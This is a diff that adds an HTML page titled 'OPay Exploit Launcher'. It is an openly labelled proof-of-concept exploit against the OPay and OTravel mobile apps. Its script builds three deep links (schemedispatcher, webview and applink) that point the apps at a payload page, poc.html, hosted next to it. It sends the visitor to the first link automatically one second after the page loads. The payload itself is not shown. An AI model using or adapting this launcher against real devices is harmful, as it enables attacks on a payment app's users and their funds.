@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OPay Launcher</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            padding: 20px;
+            text-align: center;
+            background: #f0f0f0;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            background: #00c853;
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .btn.secondary {
+            background: #555;
+            font-size: 14px;
+        }
+
+        .status {
+            margin-bottom: 20px;
+            color: #333;
+            font-size: 14px;
+        }
+
+        .small {
+            font-size: 12px;
+            color: #777;
+            margin-top: 30px;
+        }
+    </style>
+</head>
+
+<body>
+    <h3>OPay Exploit Launcher</h3>
+    <div class="status" id="status">Select a launch method:</div>
+
+    <a id="btnA" class="btn" href="#" onclick="setStatus('Launching Method A...')">Method A (Standard)</a>
+    <a id="btnB" class="btn secondary" href="#" onclick="setStatus('Launching Method B...')">Method B (WebView)</a>
+    <a id="btnC" class="btn secondary" href="#" onclick="setStatus('Launching Method C...')">Method C (AppLink)</a>
+
+    <div class="small">payload: poc.html</div>
+
+    <script>
+        var base = window.location.href.substring(0, window.location.href.lastIndexOf('/') + 1);
+        var PAYLOAD = base + "poc.html";
+
+        // Define schemes
+        var A = "otravel://schemedispatcher?action=" + PAYLOAD;
+        var B = "opay://webview?url=" + encodeURIComponent(PAYLOAD);
+        var C = "opay://applink?url=" + encodeURIComponent(PAYLOAD);
+
+        document.getElementById("btnA").href = A;
+        document.getElementById("btnB").href = B;
+        document.getElementById("btnC").href = C;
+
+        function setStatus(msg) {
+            document.getElementById("status").innerText = msg;
+        }
+
+        // Auto-launch Method A after 1s
+        setTimeout(function () {
+            setStatus("Auto-launching Method A...");
+            window.location.href = A;
+        }, 1000);
+    </script>
+</body>
+
+</html>
